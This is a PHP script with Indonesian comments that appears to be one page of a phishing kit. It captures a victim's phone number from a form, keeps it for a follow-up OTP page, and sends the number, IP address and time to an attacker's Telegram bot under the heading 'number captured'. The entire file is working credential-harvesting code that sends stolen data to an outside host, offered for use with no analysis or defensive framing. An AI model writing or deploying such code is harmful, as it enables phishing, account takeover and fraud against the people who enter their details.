<?php
// Izinkan semua metode HTTP
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

session_start();
include 'config.php';

$phone = $_POST['phone'] ?? 'Tidak diketahui';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

// Simpan nomor di session untuk halaman OTP
$_SESSION['phone'] = $phone;

// Kirim notifikasi ke Telegram
$message = "📱 NOMOR TERTANGKAP\n";
$message .= "Nomor: $phone\n";
$message .= "IP: $ip\n";
$message .= "Waktu: $time";

file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

// Redirect ke halaman OTP
header("Location: otp.php");
exit;
?>
